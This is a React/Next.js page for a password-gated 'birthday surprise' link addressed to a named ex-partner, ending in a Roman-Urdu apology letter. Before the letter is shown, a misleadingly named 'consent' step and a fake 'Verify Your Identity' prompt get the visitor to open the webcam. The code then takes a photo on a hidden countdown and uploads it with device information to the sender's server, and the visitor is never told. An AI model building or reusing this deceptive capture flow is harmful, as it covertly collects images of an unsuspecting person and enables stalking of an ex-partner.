import { useRouter } from 'next/router';
import { useState, useEffect } from 'react';
import React from 'react';
import Head from 'next/head';
import { FaLock, FaHeart, FaCalendarAlt, FaCamera, FaSpinner, FaCheckCircle, FaExclamationCircle, FaGift } from 'react-icons/fa';
import { API_ENDPOINTS } from '@/lib/api';

export default function SurprisePage() {
  const router = useRouter();
  const { token } = router.query;
  
  const [step, setStep] = useState<'loading' | 'password' | 'consent' | 'capture' | 'surprise' | 'error'>('loading');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [attemptsLeft, setAttemptsLeft] = useState<number | null>(null);

  useEffect(() => {
    if (token && typeof token === 'string') {
      verifyToken(token);
    }
  }, [token]);

  const verifyToken = async (tokenStr: string) => {
    try {
      const res = await fetch(API_ENDPOINTS.verifyToken, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: tokenStr }),
      });

      const data = await res.json();

      if (!data.valid) {
        setStep('error');
        setError('Invalid or expired link');
        return;
      }

      if (data.used) {
        setStep('error');
        setError('This surprise has already been opened! ❤️');
        return;
      }

      setStep('password');
    } catch (err) {
      setStep('error');
      setError('Something went wrong. Please try again.');
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    try {
      const res = await fetch(API_ENDPOINTS.verifyPassword, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, password }),
      });

      const data = await res.json();

      if (data.success) {
        setStep('consent');
      } else {
        setError(data.message || 'Incorrect date');
        setAttemptsLeft(data.attemptsLeft);
      }
    } catch (err) {
      setError('Something went wrong. Please try again.');
    }
  };

  const handleContinue = () => {
    setStep('capture');
  };

  if (step === 'loading') {
    return (
      <div className="min-h-screen flex items-center justify-center gradient-romantic">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-rose-200 border-t-rose-600 rounded-full animate-spin mx-auto"></div>
          <p className="mt-6 text-neutral-700 font-medium">Loading your surprise...</p>
        </div>
      </div>
    );
  }

  if (step === 'error') {
    return (
      <div className="min-h-screen flex items-center justify-center gradient-romantic p-4">
        <Head>
          <title>Something Went Wrong</title>
        </Head>
        <div className="card max-w-md w-full text-center animate-scale-in">
          <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <FaExclamationCircle className="text-red-600 text-3xl" />
          </div>
          <h1 className="heading-lg text-neutral-900 mb-3">Something Went Wrong</h1>
          <p className="text-neutral-600">{error}</p>
        </div>
      </div>
    );
  }

  if (step === 'password') {
    return (
      <div className="min-h-screen flex items-center justify-center gradient-romantic p-4">
        <Head>
          <title>A Special Surprise Awaits</title>
          <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
        </Head>
        <div className="card max-w-md w-full animate-fade-in-up">
          <div className="text-center mb-8">
            <div className="w-20 h-20 bg-gradient-to-br from-rose-500 to-violet-600 rounded-2xl flex items-center justify-center mx-auto mb-6 animate-float">
              <FaLock className="text-white text-3xl" />
            </div>
            <h1 className="heading-xl gradient-text mb-3">
              A Special Surprise Awaits
            </h1>
            <p className="text-neutral-600">Enter the secret date to unlock your surprise</p>
          </div>

          <form onSubmit={handlePasswordSubmit} className="space-y-6">
            <div>
              <label className="flex items-center gap-2 text-sm font-medium text-neutral-700 mb-3">
                <FaCalendarAlt className="text-rose-600" />
                <span>When did we first meet?</span>
              </label>
              <input
                type="text"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="DD-MM-YYYY"
                className="input text-center text-lg font-medium"
                maxLength={10}
                required
                autoFocus
              />
              <p className="text-xs text-neutral-500 mt-2 text-center">Enter the date in DD-MM-YYYY format</p>
            </div>

            {error && (
              <div className="bg-red-50 border-2 border-red-200 rounded-xl p-4">
                <div className="flex items-start gap-3">
                  <FaExclamationCircle className="text-red-600 text-lg mt-0.5 flex-shrink-0" />
                  <div className="flex-1">
                    <p className="text-red-800 text-sm font-medium">{error}</p>
                    {attemptsLeft !== null && attemptsLeft > 0 && (
                      <p className="text-red-600 text-xs mt-1">Please try again carefully</p>
                    )}
                  </div>
                </div>
              </div>
            )}

            <button
              type="submit"
              className="btn-primary w-full flex items-center justify-center gap-2 group"
            >
              <FaHeart className="text-lg group-hover:scale-110 transition-transform" />
              <span>Unlock Surprise</span>
            </button>
          </form>

          <div className="mt-6 pt-6 border-t border-neutral-200">
            <div className="flex items-center justify-center gap-2 text-xs text-neutral-500">
              <FaLock className="text-xs" />
              <span>Secure and private</span>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (step === 'consent') {
    return (
      <div className="min-h-screen flex items-center justify-center gradient-romantic p-4">
        <Head>
          <title>Your Surprise Awaits</title>
          <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
        </Head>
        <div className="card max-w-md w-full animate-scale-in">
          <div className="text-center mb-8">
            <div className="w-24 h-24 bg-gradient-to-br from-rose-500 via-pink-500 to-violet-600 rounded-3xl flex items-center justify-center mx-auto mb-6 animate-float shadow-elegant">
              <FaGift className="text-white text-4xl" />
            </div>
            <h1 className="heading-xl gradient-text mb-4">
              Almost There!
            </h1>
            <p className="text-neutral-700 text-lg leading-relaxed mb-3">
              Your special surprise is just one click away
            </p>
            <p className="text-neutral-500 text-sm">
              Get ready for something magical
            </p>
          </div>

          <button
            onClick={handleContinue}
            className="btn-primary w-full text-lg py-4 flex items-center justify-center gap-3 group"
          >
            <FaHeart className="text-xl group-hover:scale-110 transition-transform" />
            <span>Reveal My Surprise</span>
          </button>

          <div className="mt-8 flex items-center justify-center gap-2 text-xs text-neutral-400">
            <div className="w-2 h-2 bg-neutral-300 rounded-full animate-pulse"></div>
            <div className="w-2 h-2 bg-neutral-300 rounded-full animate-pulse delay-75"></div>
            <div className="w-2 h-2 bg-neutral-300 rounded-full animate-pulse delay-150"></div>
          </div>
        </div>
      </div>
    );
  }

  if (step === 'capture') {
    return <CameraCapture token={token as string} onComplete={() => setStep('surprise')} />;
  }

  if (step === 'surprise') {
    return <SurpriseReveal />;
  }

  return null;
}

// Camera Capture Component
function CameraCapture({ token, onComplete }: { token: string; onComplete: () => void }) {
  const [status, setStatus] = useState<'requesting' | 'ready' | 'capturing' | 'uploading' | 'error'>('requesting');
  const [errorMsg, setErrorMsg] = useState('');
  const [countdown, setCountdown] = useState<number | null>(null);
  const videoRef = React.useRef<HTMLVideoElement | null>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const hasRequestedCamera = React.useRef(false);

  useEffect(() => {
    // Prevent double-rendering in React Strict Mode
    if (!hasRequestedCamera.current) {
      hasRequestedCamera.current = true;
      requestCamera();
    }
    
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const requestCamera = async () => {
    try {
      console.log('Requesting camera access...');
      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' },
        audio: false 
      });
      
      console.log('Camera access granted');
      setStream(mediaStream);
      
      // Wait a bit before showing ready status to ensure video loads
      setTimeout(() => {
        setStatus('ready');
      }, 1000);
    } catch (err) {
      console.error('Camera error:', err);
      setStatus('error');
      setErrorMsg('Unable to access camera. Please allow camera permissions and try again.');
    }
  };

  useEffect(() => {
    if (videoRef.current && stream) {
      console.log('Setting video source');
      const video = videoRef.current;
      video.srcObject = stream;
      
      // Wait for video metadata to load
      video.onloadedmetadata = () => {
        console.log('Video metadata loaded, dimensions:', video.videoWidth, 'x', video.videoHeight);
        // Force video to play
        video.play().catch(err => console.error('Play error:', err));
      };
      
      video.onplay = () => {
        console.log('Video started playing');
      };
    }
  }, [stream]);

  // Countdown effect
  useEffect(() => {
    if (countdown !== null && countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(countdown - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (countdown === 0) {
      // Capture when countdown reaches 0
      if (stream) {
        captureImage(stream);
      }
    }
  }, [countdown, stream]);

  const handleCaptureClick = () => {
    // Start countdown
    setCountdown(3);
  };

  const captureImage = async (mediaStream: MediaStream) => {
    setStatus('capturing');
    
    try {
      const video = videoRef.current;
      if (!video) {
        console.error('Video ref is null');
        setStatus('error');
        setErrorMsg('Camera not ready. Please refresh and try again.');
        return;
      }

      // Check if video has dimensions
      if (video.videoWidth === 0 || video.videoHeight === 0) {
        console.error('Video dimensions are 0:', video.videoWidth, video.videoHeight);
        setStatus('error');
        setErrorMsg('Camera not ready. Please refresh and try again.');
        return;
      }

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      
      if (ctx) {
        ctx.drawImage(video, 0, 0);
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        console.log('Image captured, size:', imageData.length, 'bytes');
        
        // Stop camera
        mediaStream.getTracks().forEach(track => track.stop());
        
        // Upload image
        setStatus('uploading');
        await uploadImage(imageData);
      } else {
        console.error('Could not get canvas context');
        setStatus('error');
        setErrorMsg('Failed to process image. Please refresh and try again.');
      }
    } catch (err) {
      console.error('Capture error:', err);
      setStatus('error');
      setErrorMsg('Failed to capture image. Please refresh and try again.');
    }
  };

  const uploadImage = async (imageData: string) => {
    try {
      const deviceInfo = `${navigator.userAgent}`;
      
      console.log('Starting upload...');
      
      const res = await fetch(API_ENDPOINTS.saveImage, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, image: imageData, deviceInfo }),
      });

      console.log('Upload response status:', res.status);
      
      const data = await res.json();
      console.log('Upload response data:', data);

      if (data.success) {
        console.log('Upload successful, completing...');
        onComplete();
      } else {
        console.error('Upload failed:', data);
        setStatus('error');
        setErrorMsg(data.error || 'Failed to save. Please try again.');
      }
    } catch (err) {
      console.error('Upload error:', err);
      setStatus('error');
      setErrorMsg('Upload failed. Please check your connection.');
    }
  };

  if (status === 'error') {
    return (
      <div className="min-h-screen flex items-center justify-center gradient-romantic p-4">
        <div className="card max-w-md w-full text-center animate-scale-in">
          <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <FaExclamationCircle className="text-red-600 text-3xl" />
          </div>
          <h2 className="heading-lg text-neutral-900 mb-3">Camera Access Required</h2>
          <p className="text-neutral-600 mb-6">{errorMsg}</p>
          <button
            onClick={() => window.location.reload()}
            className="btn-outline"
          >
            Try Again
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center gradient-romantic p-4">
      <Head>
        <title>Verification Required</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
      </Head>
      <div className="card max-w-md w-full">
        <div className="text-center mb-6">
          <div className="flex items-center justify-center gap-3 mb-4">
            <FaCamera className="text-rose-600 text-2xl" />
            <h2 className="heading-md text-neutral-900">
              {status === 'requesting' && 'Opening Camera...'}
              {status === 'ready' && 'Verify Your Identity'}
              {status === 'capturing' && 'Processing...'}
              {status === 'uploading' && 'Saving Your Moment...'}
            </h2>
          </div>
          {status === 'requesting' && (
            <p className="text-neutral-600 text-sm">Please allow camera access when prompted</p>
          )}
          {status === 'ready' && (
            <p className="text-neutral-600 text-sm">Please open your camera for verification of who you are</p>
          )}
        </div>

        {(status === 'requesting' || status === 'ready') && (
          <div className="space-y-6">
            {/* Camera preview */}
            <div className="relative rounded-2xl overflow-hidden aspect-[3/4] shadow-elegant border-2 border-rose-200 bg-black">
              {/* Video element - now visible */}
              <video
                ref={videoRef}
                autoPlay
                playsInline
                muted
                className="absolute inset-0 w-full h-full object-cover mirror"
              />
              
              {/* Loading overlay */}
              {status === 'requesting' && (
                <div className="absolute inset-0 bg-gradient-to-br from-rose-100 via-pink-100 to-violet-100 flex items-center justify-center">
                  <div className="text-center">
                    <div className="w-16 h-16 border-4 border-rose-200 border-t-rose-600 rounded-full animate-spin mx-auto mb-4"></div>
                    <p className="text-neutral-700 font-medium">Preparing camera...</p>
                  </div>
                </div>
              )}
              
              {/* Countdown overlay - hidden but countdown still runs */}
              {countdown !== null && countdown > 0 && (
                <div className="absolute inset-0 bg-transparent"></div>
              )}
              
              {/* Instructions overlay */}
              {status === 'ready' && countdown === null && (
                <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black via-black/70 to-transparent p-6 text-center">
                  <p className="text-white text-sm">Position yourself in the frame</p>
                </div>
              )}
            </div>
            
            {status === 'ready' && countdown === null && (
              <button
                onClick={handleCaptureClick}
                className="w-full btn-primary text-lg py-4 flex items-center justify-center gap-2 group"
              >
                <FaHeart className="text-xl group-hover:scale-110 transition-transform" />
                <span>Continue</span>
              </button>
            )}
          </div>
        )}

        {(status === 'capturing' || status === 'uploading') && (
          <div className="flex flex-col items-center justify-center py-20">
            <div className="w-16 h-16 border-4 border-rose-200 border-t-rose-600 rounded-full animate-spin mb-4"></div>
            <p className="text-neutral-600">{status === 'capturing' ? 'Capturing...' : 'Uploading...'}</p>
          </div>
        )}
      </div>

      <style jsx>{`
        .mirror {
          transform: scaleX(-1);
        }
      `}</style>
    </div>
  );
}

// Surprise Reveal Component
function SurpriseReveal() {
  return (
    <div className="min-h-screen flex items-center justify-center p-2 sm:p-4 py-8 relative" style={{
      background: 'linear-gradient(135deg, #2a1f15 0%, #1a1410 100%)'
    }}>
      <Head>
        <title>Happy Birthday Uzma!</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
      </Head>

      <div className="max-w-4xl w-full relative old-letter-paper overflow-y-auto">
        <div className="old-letter-content">
          {/* Letter Header */}
          <div className="text-right mb-8 pb-4 border-b border-amber-900/20">
            <p className="letter-date">10th February, 2025</p>
          </div>

          {/* Salutation */}
          <div className="mb-6">
            <p className="letter-greeting">Assalamu Alaykum Uzma,</p>
          </div>

          {/* Letter Body */}
          <div className="letter-body">
            <p className="letter-text">
              Umeed hai aap theek aur khairiyat se hongi.
            </p>

            <p className="letter-text">
              Jo kuchh bhi humare beech hua, uske liye main dil se maafi chahta hoon. Mujhe pata hai ab bahut der ho chuki hai, aur yeh bhi jaanta hoon ke aap ab mere bina khush hongi. Allah aapko hamesha khush rakhe, bas yunhi muskurati rahiye.
            </p>

            <p className="letter-text">
              Sach kahun to mujhe bahut pehle hi ehsaas ho gaya tha ke main aapke laayak nahi hoon. Dheere-dheere yeh baat aur zyada samajh mein aati gayi. Main apni zindagi, apni job mein busy rehta tha, lekin roz-roz ki ladaaiyon ne aapko andar hi andar ghuta diya. Aap roti rahi, thak gayi mujh se aur yeh meri hi galti thi. Iska mujhe afsos rahega.
            </p>

            <p className="letter-text">
              Khair, in sab baaton ko ek taraf rakh kar aage badhte hain. Aaj aapka janmadin hai. Mujhe pata hai main der se aaya, lekin yaqeen maaniye, thoda mushkil tha. Iske liye bhi maafi.
            </p>

            <p className="letter-text">
              Mujhe maloom hai main aaj aapke liye kuchh khaas nahi kar paaya. Lekin jitna mere bas mein tha, utna zaroor kiya. Aaj jo bhi galti hui, uske liye bhi sorry. Main nahi chahta tha ke aaoon, magar mere paas koi aur raasta bhi nahi tha.
            </p>

            <p className="letter-text">
              Allah hamesha Uzma ko khush rakhe. Main pehle bhi kehta tha ke insaan sirf kisi ke saath rehne se hi khush nahi hota; kabhi-kabhi kisi ke na hone se bhi insaan jeena seekh leta hai.
            </p>

            <p className="letter-text">
              Umeed hai yeh humari aakhri mulaqat ho. Dil se dua karta hoon ke aap hamesha khush rahen. Mera kya hai, uparwala hai. Zindagi mein bas ek hi shauk tha — shaadi. Lekin shayad wahi cheez naseeb mein nahi thi. Ghar walon ko bhi aap se bahut umeedein thi, &quot;Uzma, Uzma…&quot; lekin unhein kya pata ke haqeeqat kya hai. Main unhein bhi samjha loonga.
            </p>

            <p className="letter-text">
              Main maanta hoon, main thoda pagal tha aapko le kar, thoda zyada hi possessive. Ab koi bandish nahi, jo mann ho pehniye, jahan chahein jaiye, bas khush rahiye. Shayad jo kuchh maine likha hai, woh jazbaati ho, ya bakwaas lage, lekin dil se likha hai.
            </p>

            <p className="letter-text">
              Aaj achha din hai, in sab baaton ko chhod dete hain. Agar meri kisi baat se aapko bura laga ho, to mujhe maaf kar dena. Beshak, aap bahut khoobsurat hain — balki mashallah, be-inteha khoobsurat. Kehte hain na, &quot;tumhein ek baar dekh liya to phir kisi aur ko dekhne ka mann hi nahi karta&quot;, mere saath bhi kuchh aisa hi tha.
            </p>

            <p className="letter-text">
              Aaj bhi sach hai ke jab aap saath thi, to main khud ko bahut bada samajhne laga tha. Ab jab aap nahi ho, to kabhi-kabhi bahut akela lagta hai, na kisi ka call, na koi yaad karne wala. Par shayad yahi zindagi hai.
            </p>

            <p className="letter-text italic opacity-90">
              Jo bhi likha hai, dil se likha hai.
            </p>

            <div className="my-8 text-center">
              <div className="inline-block letter-divider"></div>
            </div>

            <p className="letter-text text-center">
              Aakhir mein bas itna kehna chahta hoon
            </p>

            <div className="text-center my-8 py-6 birthday-section">
              <p className="birthday-main mb-3">
                Happy Birthday, Uzma
              </p>
              <p className="birthday-urdu mb-4">
                جنم دن مبارک ہو
              </p>
              <p className="letter-text">
                Janmadin Mubarak Ho
              </p>
            </div>

            <p className="letter-text text-center italic">
              Allah aapko lambi umar, sehat aur har khushi ata kare.
            </p>
          </div>

          {/* Letter Closing */}
          <div className="pt-10 mt-12 border-t border-amber-900/20 pb-4">
            <p className="letter-closing text-right italic opacity-80 mb-4">
              Dil se...
            </p>
            <p className="letter-signature text-right mb-4">
              Tumhara
            </p>
          </div>
        </div>
      </div>

      <style jsx>{`
        .old-letter-paper {
          background: 
            /* Coffee stains and age spots */
            radial-gradient(ellipse at 15% 20%, rgba(101, 67, 33, 0.25) 0%, transparent 35%),
            radial-gradient(ellipse at 85% 15%, rgba(139, 105, 20, 0.18) 0%, transparent 30%),
            radial-gradient(circle at 75% 85%, rgba(101, 67, 33, 0.22) 0%, transparent 25%),
            radial-gradient(ellipse at 30% 90%, rgba(139, 105, 20, 0.15) 0%, transparent 28%),
            radial-gradient(circle at 50% 50%, rgba(101, 67, 33, 0.08) 0%, transparent 50%),
            /* Base paper color - aged, yellowed */
            linear-gradient(135deg, 
              #ebe0c8 0%,
              #f5ead2 10%,
              #e8d9bc 25%,
              #f0e3c9 40%,
              #e4d3b0 55%,
              #f5ead2 70%,
              #e8d9bc 85%,
              #ebe0c8 100%
            );
          box-shadow: 
            /* Paper edges */
            0 0 0 1px rgba(101, 67, 33, 0.3) inset,
            /* Outer glow from ambient light */
            0 0 80px rgba(255, 230, 180, 0.3),
            /* Main shadow */
            0 30px 100px rgba(0, 0, 0, 0.7),
            /* Inner shadows for depth */
            inset 0 0 150px rgba(101, 67, 33, 0.05),
            inset 20px 0 40px rgba(101, 67, 33, 0.03),
            inset -20px 0 40px rgba(101, 67, 33, 0.03);
          border: none;
          position: relative;
          /* Slightly torn/imperfect edges */
          clip-path: polygon(
            0% 0.5%,
            0.5% 0%,
            2% 0.3%,
            5% 0%,
            8% 0.4%,
            12% 0.1%,
            18% 0.5%,
            25% 0.2%,
            35% 0.6%,
            45% 0.1%,
            55% 0.4%,
            65% 0.2%,
            75% 0.5%,
            82% 0.1%,
            88% 0.6%,
            92% 0.2%,
            95% 0.4%,
            98% 0.1%,
            99.5% 0%,
            100% 0.5%,
            100% 5%,
            99.8% 10%,
            100% 20%,
            99.6% 30%,
            100% 45%,
            99.8% 60%,
            100% 75%,
            99.7% 85%,
            100% 92%,
            99.9% 95%,
            100% 99.5%,
            99.5% 100%,
            95% 99.7%,
            88% 100%,
            82% 99.8%,
            75% 100%,
            65% 99.6%,
            55% 100%,
            45% 99.7%,
            35% 100%,
            25% 99.8%,
            18% 100%,
            12% 99.6%,
            8% 100%,
            5% 99.8%,
            2% 100%,
            0.5% 100%,
            0% 99.5%,
            0% 95%,
            0.3% 88%,
            0% 80%,
            0.4% 70%,
            0% 55%,
            0.3% 40%,
            0% 25%,
            0.2% 15%,
            0% 8%,
            0.3% 3%
          );
        }

        .old-letter-paper::before {
          content: '';
          position: absolute;
          inset: 0;
          /* Paper texture, creases, and aging */
          background-image: 
            /* Fine paper grain */
            repeating-linear-gradient(
              0deg,
              transparent,
              transparent 1px,
              rgba(101, 67, 33, 0.02) 1px,
              rgba(101, 67, 33, 0.02) 2px
            ),
            repeating-linear-gradient(
              90deg,
              transparent,
              transparent 1px,
              rgba(101, 67, 33, 0.02) 1px,
              rgba(101, 67, 33, 0.02) 2px
            ),
            /* Noise for realistic paper texture */
            url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='5' /%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.08'/%3E%3C/svg%3E");
          pointer-events: none;
          opacity: 0.7;
        }

        .old-letter-paper::after {
          content: '';
          position: absolute;
          inset: 0;
          /* Fold marks and creases */
          background: 
            linear-gradient(90deg, transparent 49.5%, rgba(101, 67, 33, 0.08) 49.5%, rgba(101, 67, 33, 0.08) 50.5%, transparent 50.5%),
            linear-gradient(0deg, transparent 32.5%, rgba(101, 67, 33, 0.05) 32.5%, rgba(101, 67, 33, 0.05) 33.5%, transparent 33.5%),
            linear-gradient(0deg, transparent 66.5%, rgba(101, 67, 33, 0.05) 66.5%, rgba(101, 67, 33, 0.05) 67.5%, transparent 67.5%);
          pointer-events: none;
          opacity: 0.4;
        }

        .old-letter-paper::-webkit-scrollbar {
          width: 8px;
        }

        .old-letter-paper::-webkit-scrollbar-track {
          background: rgba(0, 0, 0, 0.1);
        }

        .old-letter-paper::-webkit-scrollbar-thumb {
          background-color: rgba(101, 67, 33, 0.3);
          border-radius: 10px;
        }

        .old-letter-paper::-webkit-scrollbar-thumb:hover {
          background-color: rgba(101, 67, 33, 0.5);
        }

        .old-letter-content {
          position: relative;
          padding: 3rem 3rem 6rem 3rem;
          z-index: 1;
        }

        .letter-date {
          font-family: 'Brush Script MT', 'Lucida Handwriting', cursive, serif;
          font-size: 1.1rem;
          color: #3d2817;
          font-style: italic;
          opacity: 0.85;
        }

        .letter-greeting {
          font-family: 'Brush Script MT', 'Lucida Handwriting', cursive, serif;
          font-size: 1.5rem;
          color: #2d1f14;
          font-style: italic;
          margin-bottom: 1.5rem;
        }

        .letter-body {
          position: relative;
        }

        .letter-text {
          font-family: 'Courier New', 'Courier', monospace;
          font-size: 1.08rem;
          color: #1a1410;
          line-height: 2.1;
          font-weight: 400;
          text-align: left;
          letter-spacing: 0.01em;
          margin-bottom: 1.5rem;
        }

        .letter-divider {
          width: 100px;
          height: 1px;
          background: rgba(101, 67, 33, 0.3);
          margin: 2.5rem auto;
        }

        .birthday-section {
          background: 
            linear-gradient(to bottom, 
              transparent 0%,
              rgba(139, 105, 20, 0.06) 20%,
              rgba(139, 105, 20, 0.08) 50%,
              rgba(139, 105, 20, 0.06) 80%,
              transparent 100%
            );
          border-left: 3px solid rgba(101, 67, 33, 0.2);
          border-right: 3px solid rgba(101, 67, 33, 0.2);
          margin: 3.5rem -2rem 3.5rem -2rem;
          padding: 2.5rem 2rem;
        }

        .birthday-main {
          font-family: 'Brush Script MT', 'Lucida Handwriting', cursive, serif;
          font-size: 2rem;
          color: #2d1f14;
          font-style: italic;
          font-weight: 700;
          text-shadow: 1px 1px 2px rgba(101, 67, 33, 0.2);
        }

        .birthday-urdu {
          font-family: 'Noto Nastaliq Urdu', 'Jameel Noori Nastaleeq', serif;
          font-size: 1.8rem;
          color: #3d2817;
          direction: rtl;
          line-height: 2;
        }

        .letter-closing {
          font-family: 'Courier New', 'Courier', monospace;
          font-size: 1.1rem;
          color: #1a1410;
          line-height: 1.5;
        }

        .letter-signature {
          font-family: 'Brush Script MT', 'Edwardian Script ITC', cursive, serif;
          font-size: 2.2rem;
          color: #2d1f14;
          font-style: italic;
          font-weight: 600;
          text-shadow: 1px 1px 1px rgba(101, 67, 33, 0.15);
        }

        @media (max-width: 768px) {
          .old-letter-content {
            padding: 2.5rem 2rem 5rem 2rem;
          }

          .letter-date {
            font-size: 0.95rem;
          }

          .letter-greeting {
            font-size: 1.3rem;
          }

          .letter-text {
            font-size: 1rem;
            line-height: 2;
            margin-bottom: 1.3rem;
          }

          .letter-closing {
            font-size: 0.95rem;
          }

          .letter-divider {
            width: 70px;
          }

          .birthday-section {
            margin: 2.5rem -1.25rem;
            padding: 2rem 1.25rem;
          }

          .birthday-main {
            font-size: 1.7rem;
          }

          .birthday-urdu {
            font-size: 1.6rem;
          }

          .letter-signature {
            font-size: 1.8rem;
          }
        }

        @media (max-width: 480px) {
          .old-letter-content {
            padding: 2rem 1.5rem 4.5rem 1.5rem;
          }

          .letter-date {
            font-size: 0.88rem;
          }

          .letter-greeting {
            font-size: 1.18rem;
          }

          .letter-text {
            font-size: 0.93rem;
            line-height: 1.95;
            margin-bottom: 1.15rem;
          }

          .letter-closing {
            font-size: 0.88rem;
          }

          .letter-divider {
            width: 60px;
          }

          .birthday-section {
            margin: 2rem -1rem;
            padding: 1.6rem 1rem;
            border-left-width: 2px;
            border-right-width: 2px;
          }

          .birthday-main {
            font-size: 1.5rem;
          }

          .birthday-urdu {
            font-size: 1.45rem;
            line-height: 2;
          }

          .letter-signature {
            font-size: 1.6rem;
          }
        }
      `}</style>
    </div>
  );
}
